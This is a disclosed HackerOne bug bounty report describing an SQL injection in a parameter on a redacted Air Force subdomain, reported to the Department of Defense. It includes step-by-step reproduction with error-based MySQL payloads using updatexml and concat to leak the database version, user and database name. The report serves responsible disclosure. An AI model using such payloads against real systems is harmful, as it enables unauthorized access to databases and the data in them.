# SQL Injection on █████

## Report Details
- **Report ID**: 277380
- **URL**: https://hackerone.com/reports/277380
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-10-15T12:16:38.080Z
- **Disclosed**: 2022-05-12T19:57:32.374Z

## Reporter
- **Username**: cdl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does not properly sanitize ' characters, allowing an attacker to execute SQL queries!

### Impact

This could potentially expose sensitive information because an attacker could potentially dump the databases on this server!

### Step-by-step Reproduction Instructions

    1.) Open Firefox or any browser
    2.) Visit `https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil`
    3.) You will see the MySQL version in the response => `██████████`

User - `███████`
payload => `https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil`

Database - `████`
payload => `https://██████/█████████████=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil`

██████
### Suggested Mitigation/Remediation Actions

Sanitize input!

Thanks!
- Corben Douglas [@sxcurity](https://twitter.com/sxcurity)


## Attachments
No attachments
